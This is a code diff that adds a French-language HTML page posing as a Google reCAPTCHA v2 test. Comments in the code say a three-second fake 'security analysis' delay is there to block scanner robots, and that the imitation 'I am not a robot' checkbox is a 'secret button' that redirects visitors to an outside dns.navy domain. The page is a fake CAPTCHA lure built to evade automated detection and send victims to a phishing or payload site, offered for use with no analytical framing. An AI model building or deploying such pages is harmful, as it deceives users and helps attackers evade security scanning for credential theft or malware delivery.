@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset='utf-8'/>
+    <!-- Optimisation parfaite pour iPhone et Android -->
+    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport'/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    
+    <title>reCAPTCHA Verification</title>
+    <style>
+        body {
+            background-color: #ffffff;
+            font-family: "Roboto", helvetica, arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 90vh;
+            margin: 0;
+            color: #777;
+        }
+        .header-img {
+            opacity: 0.1;
+            width: 120px;
+            margin-bottom: 30px;
+        }
+        .text-top {
+            font-size: 14px;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .text-sub {
+            font-size: 13px;
+            margin-bottom: 30px;
+            text-align: center;
+            padding: 0 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: normal;
+            color: #555;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+        /* Design identique à ton image de référence */
+        .captcha-box {
+            background-color: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            width: 300px;
+            height: 74px;
+            display: none; /* Masqué pour l'analyse de 3 secondes */
+            align-items: center;
+            padding: 0 12px;
+            cursor: pointer;
+            transition: border 0.2s;
+            text-decoration: none;
+            color: black;
+        }
+        .captcha-box:hover {
+            border: 1px solid #b2b2b2;
+        }
+        .checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            background-color: #fff;
+            margin-right: 15px;
+        }
+        .label-text {
+            font-size: 14px;
+            flex-grow: 1;
+        }
+        .logo-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo-section img {
+            width: 32px;
+        }
+        .logo-section span {
+            font-size: 8px;
+            color: #555;
+            margin-top: 2px;
+        }
+        hr {
+            width: 80%;
+            max-width: 500px;
+            border: 0;
+            border-top: 1px solid #eee;
+            margin-top: 60px;
+        }
+        #waiting {
+            font-size: 14px;
+            color: #999;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <img class="header-img" src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" alt="re">
+
+    <div class="text-top">What is this?</div>
+    <div class="text-sub">Here you can <b>test Google's reCAPTCHA</b>.</div>
+
+    <h1>Test reCAPTCHA v2 below</h1>
+
+    <!-- Message d'attente pour bloquer les robots scanners -->
+    <div id="waiting">Analyse de sécurité de votre navigateur en cours...</div>
+
+    <!-- Le bouton secret qui redirige vers ton site Plesk -->
+    <a href="https://nreltyil.dns.navy/" class="captcha-box" id="captcha-box">
+        <div class="checkbox"></div>
+        <div class="label-text">Je ne suis pas un robot</div>
+        <div class="logo-section">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="re">
+            <span>reCAPTCHA</span>
+            <span style="font-size: 7px;">Privacy - Terms</span>
+        </div>
+    </a>
+
+    <hr>
+
+    <script>
+        // Pause de 3 secondes avant l'affichage du bouton
+        setTimeout(function(){
+            document.getElementById('waiting').style.display = 'none';
+            document.getElementById('captcha-box').style.display = 'flex';
+        }, 3000);
+    </script>
+
+</body>
+</html>
